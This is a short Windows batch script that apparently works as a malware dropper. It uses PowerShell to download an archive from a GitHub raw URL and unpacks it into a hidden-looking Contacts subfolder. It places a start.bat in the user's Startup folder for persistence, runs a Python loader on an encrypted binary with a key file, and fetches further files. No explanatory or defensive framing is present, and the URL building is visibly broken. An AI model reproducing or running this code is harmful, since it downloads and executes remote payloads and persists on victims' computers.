@echo off

setlocal
set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/zo.zip"
set "z=%TEMP%\zo.zip"
set "d=%USERPROFILE%\Contacts\zo"
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"

:: Download zo.zip from the website
powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%zo.zip','%z%')"

:: Extract the zip file
powershell -nologo -noprofile -command "Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force"
del "%z%"

:: Download start.bat from the same website
powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%start.bat','%s%')"

:: Run the Python script
cd /d "%d%"
python.exe sh.py -i voo.bin -k x.txt

:: Download result files based on exit code
if %errorlevel%==0 (
    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%a.txt','%TEMP%\a.txt')"
) else (
    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%site_url%b.txt','%TEMP%\b.txt')"
)